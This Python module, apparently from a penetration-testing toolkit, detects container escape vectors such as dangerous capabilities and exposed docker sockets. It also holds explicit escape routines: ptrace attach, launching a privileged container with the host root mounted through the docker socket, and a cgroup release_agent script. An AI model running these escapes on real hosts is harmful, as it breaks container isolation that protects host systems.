# Container escape detection and (explicit) exploitation.
# Detects dangerous capabilities/mounts and reports escape vectors. The
# exploit_* methods are only ever called deliberately -- detection never
# auto-runs an escape.
import ctypes
import logging
import os
from pathlib import Path
from typing import Any, ClassVar

logger = logging.getLogger("h4k.container_escape")

# Linux capability bit -> name. Single source of truth for decoding.
_CAP_NAMES: dict[int, str] = {
    0: "CAP_CHOWN",
    1: "CAP_DAC_OVERRIDE",
    2: "CAP_DAC_READ_SEARCH",
    3: "CAP_FOWNER",
    4: "CAP_FSETID",
    5: "CAP_KILL",
    6: "CAP_SETGID",
    7: "CAP_SETUID",
    8: "CAP_SETPCAP",
    9: "CAP_LINUX_IMMUTABLE",
    10: "CAP_NET_BIND_SERVICE",
    11: "CAP_NET_BROADCAST",
    12: "CAP_NET_ADMIN",
    13: "CAP_NET_RAW",
    14: "CAP_IPC_LOCK",
    15: "CAP_IPC_OWNER",
    16: "CAP_SYS_MODULE",
    17: "CAP_SYS_RAWIO",
    18: "CAP_SYS_CHROOT",
    19: "CAP_SYS_PTRACE",
    20: "CAP_SYS_PACCT",
    21: "CAP_SYS_ADMIN",
    22: "CAP_SYS_BOOT",
    23: "CAP_SYS_NICE",
    24: "CAP_SYS_RESOURCE",
    25: "CAP_SYS_TIME",
    26: "CAP_SYS_TTY_CONFIG",
    27: "CAP_MKNOD",
    28: "CAP_LEASE",
    29: "CAP_AUDIT_WRITE",
    30: "CAP_AUDIT_CONTROL",
    31: "CAP_SETFCAP",
    32: "CAP_MAC_OVERRIDE",
    33: "CAP_MAC_ADMIN",
    34: "CAP_SYSLOG",
    35: "CAP_WAKE_ALARM",
    36: "CAP_BLOCK_SUSPEND",
    37: "CAP_AUDIT_READ",
    38: "CAP_PERFMON",
    39: "CAP_BPF",
    40: "CAP_CHECKPOINT_RESTORE",
}


class ContainerEscape:
    """Detect and (on request) exploit container escape vectors."""

    DANGEROUS_CAPS: ClassVar[dict[str, str]] = {
        "CAP_SYS_PTRACE": "ptrace another process (sandbox escape)",
        "CAP_DAC_OVERRIDE": "bypass file permission checks",
        "CAP_SYS_ADMIN": "mount namespaces, pivot_root",
        "CAP_SYS_MODULE": "load kernel modules",
        "CAP_SYS_RAWIO": "raw I/O port access",
        "CAP_SYS_RESOURCE": "override resource limits",
        "CAP_SYS_BOOT": "reboot the host",
        "CAP_SYS_TIME": "set system time",
        "CAP_DAC_READ_SEARCH": "read any file",
        "CAP_LINUX_IMMUTABLE": "modify immutable files",
        "CAP_MAC_OVERRIDE": "override MAC policy",
        "CAP_MAC_ADMIN": "configure MAC",
        "CAP_SYSLOG": "read the kernel log",
        "CAP_WAKE_ALARM": "wake the system",
    }

    DANGEROUS_MOUNTS: ClassVar[tuple[str, ...]] = (
        "/var/run/docker.sock",
        "/var/run/containerd/containerd.sock",
        "/run/containerd/containerd.sock",
        "/host",
        "/proc/sys",
    )

    def __init__(self) -> None:
        self.caps: list[str] = []
        self.mounts: list[str] = []
        self.cgroup_path: str = ""

    def detect(self) -> dict[str, Any]:
        """Detect escape vectors in the current container (read-only)."""
        self._read_caps()
        self._read_mounts()
        self._read_cgroup()
        return {
            "capabilities": self.caps,
            "dangerous_caps": [c for c in self.caps if c in self.DANGEROUS_CAPS],
            "mounts": self.mounts,
            "dangerous_mounts": [
                m for m in self.mounts if any(d in m for d in self.DANGEROUS_MOUNTS)
            ],
            "cgroup_path": self.cgroup_path,
            "is_privileged": self._is_privileged(),
            "vectors": self._generate_vectors(),
        }

    def _read_caps(self) -> None:
        try:
            with open("/proc/self/status", encoding="utf-8") as fh:
                for line in fh:
                    if line.startswith("CapPrm:"):
                        self.caps = self._decode_caps(int(line.split()[1], 16))
                        break
        except Exception as exc:  # pragma: no cover - defensive
            logger.debug("could not read caps: %s", exc)

    @staticmethod
    def _decode_caps(cap_mask: int) -> list[str]:
        return [name for bit, name in _CAP_NAMES.items() if cap_mask & (1 << bit)]

    def _read_mounts(self) -> None:
        try:
            with open("/proc/mounts", encoding="utf-8") as fh:
                for line in fh:
                    parts = line.split()
                    if len(parts) >= 2:
                        self.mounts.append(parts[1])
        except Exception as exc:  # pragma: no cover - defensive
            logger.debug("could not read mounts: %s", exc)

    def _read_cgroup(self) -> None:
        try:
            with open("/proc/self/cgroup", encoding="utf-8") as fh:
                content = fh.read().strip()
            if content:
                self.cgroup_path = content.split("\n")[-1]
        except Exception as exc:  # pragma: no cover - defensive
            logger.debug("could not read cgroup: %s", exc)

    def _is_privileged(self) -> bool:
        # A privileged container normally gets the full capability set (41 bits).
        return len(self.caps) >= 38

    def _generate_vectors(self) -> list[dict[str, Any]]:
        vectors: list[dict[str, Any]] = []
        for cap in self.caps:
            if cap in self.DANGEROUS_CAPS:
                vectors.append(
                    {
                        "type": "capability",
                        "name": cap,
                        "description": self.DANGEROUS_CAPS[cap],
                        "exploit": self._exploit_for_cap(cap),
                    }
                )
        for mount in self.mounts:
            for dangerous in self.DANGEROUS_MOUNTS:
                if dangerous in mount:
                    vectors.append(
                        {
                            "type": "mount",
                            "name": mount,
                            "description": f"exposed host path: {dangerous}",
                            "exploit": self._exploit_for_mount(dangerous),
                        }
                    )
        return vectors

    @staticmethod
    def _exploit_for_cap(cap: str) -> str | None:
        return {
            "CAP_SYS_PTRACE": "ptrace_attach_sandbox_escape",
            "CAP_SYS_ADMIN": "mount_namespace_escape",
            "CAP_DAC_OVERRIDE": "read_host_files",
        }.get(cap)

    @staticmethod
    def _exploit_for_mount(mount: str) -> str | None:
        return {
            "/var/run/docker.sock": "docker_socket_escape",
            "/run/containerd/containerd.sock": "containerd_socket_escape",
            "/host": "host_root_mount",
        }.get(mount)

    def exploit_ptrace(self, target_pid: int) -> dict[str, Any]:
        """Attempt a ptrace attach (needs CAP_SYS_PTRACE). Explicit call only."""
        if "CAP_SYS_PTRACE" not in self.caps:
            return {"success": False, "reason": "CAP_SYS_PTRACE not available"}
        try:
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            if libc.ptrace(16, target_pid, 0, 0) == 0:  # PTRACE_ATTACH
                return {"success": True, "method": "PTRACE_ATTACH", "pid": target_pid}
            return {"success": False, "reason": f"ptrace failed: {ctypes.get_errno()}"}
        except Exception as exc:  # pragma: no cover - defensive
            return {"success": False, "reason": str(exc)}

    def exploit_docker_socket(self) -> dict[str, Any]:
        """Escape via a mounted docker/containerd socket. Explicit call only."""
        import importlib.util

        if importlib.util.find_spec("docker") is None:
            return {"success": False, "reason": "docker SDK not installed"}
        for sock in (
            "/var/run/docker.sock",
            "/var/run/containerd/containerd.sock",
        ):
            if not Path(sock).exists():
                continue
            try:
                import docker  # type: ignore[import-untyped]

                client = docker.DockerClient(base_url=f"unix://{sock}")
                client.containers.run(
                    "alpine",
                    "id",
                    remove=True,
                    privileged=True,
                    volumes={"/": {"bind": "/host", "mode": "rw"}},
                )
                return {"success": True, "method": "docker_socket", "socket": sock}
            except Exception as exc:  # pragma: no cover - defensive
                logger.debug("docker socket exploit failed: %s", exc)
        return {"success": False, "reason": "no accessible docker socket"}

    def exploit_cgroup_release_agent(self) -> dict[str, Any]:
        """cgroup v1 release_agent escape (needs a writable cgroup).

        Modern hosts are usually cgroup v2 with no release_agent, in which
        case this honestly reports unavailable.
        """
        cgroup_dir = Path("/sys/fs/cgroup")
        release_agent = cgroup_dir / "release_agent"
        if not release_agent.exists() or not os.access(cgroup_dir, os.W_OK):
            return {
                "success": False,
                "reason": "cgroup v2 or release_agent not writable",
            }
        try:
            script = Path("/tmp/escape.sh")  # nosec B108 - escape payload path
            script.write_text("#!/bin/sh\nid > /tmp/escape.out\n", encoding="utf-8")
            os.chmod(script, 0o755)  # nosec B103 - must be executable by the host
            release_agent.write_text(str(script), encoding="utf-8")
            (cgroup_dir / "notify_on_release").write_text("1", encoding="utf-8")
            return {"success": True, "method": "cgroup_release_agent"}
        except Exception as exc:  # pragma: no cover - defensive
            return {"success": False, "reason": str(exc)}

    def check_host_escape(self) -> dict[str, Any]:
        """Report which escape vectors exist. Never auto-executes an exploit."""
        return {
            "is_container": Path("/.dockerenv").exists()
            or "docker" in self.cgroup_path,
            "privileged": self._is_privileged(),
            "vectors": self._generate_vectors(),
        }
